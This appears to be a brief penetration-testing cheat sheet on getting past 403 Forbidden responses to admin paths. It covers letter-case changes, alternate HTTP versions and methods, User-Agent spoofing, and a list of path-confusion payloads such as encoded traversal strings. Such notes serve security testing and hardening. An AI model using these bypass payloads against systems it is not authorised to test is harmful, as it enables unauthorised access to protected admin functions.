
# Authorization Bypass
##  Change the Letter Case

❌ /admin → 403 Forbidden

✅ /AdMiN → 200 OK

This trick works especially well in older or misconfigured Linux-based systems or with poorly written route matchers.

## Alternate HTTP Versions
For example:

HTTP/1.1 – Standard
HTTP/1.0 – May skip Host header enforcement
HTTP/0.9 – Legacy
HTTP/2 or HTTP/3 – Can expose flawed protocol handlers

❌ /admin with HTTP/1.1 → 403

✅ /admin with HTTP/1.0 → 200
## HTTP Method Fuzzing

❌ GET /admin → 403

❌ POST /admin → 403

✅ PATCH /admin → 200

## User-Agent Fuzzing
Some systems implement User-Agent based access control, especially for internal services, admin panels, or bots.

By spoofing the User-Agent, you can pretend to be:
* A search engine bot
* An internal scanner
* A developer tool

##  Path Fuzzing (Path Traversal Confusion)
### Common tricks:
```
/admin/..;/

/./admin/

//admin//

/admin?

%2e%2e/admin (Encoded ../)
```
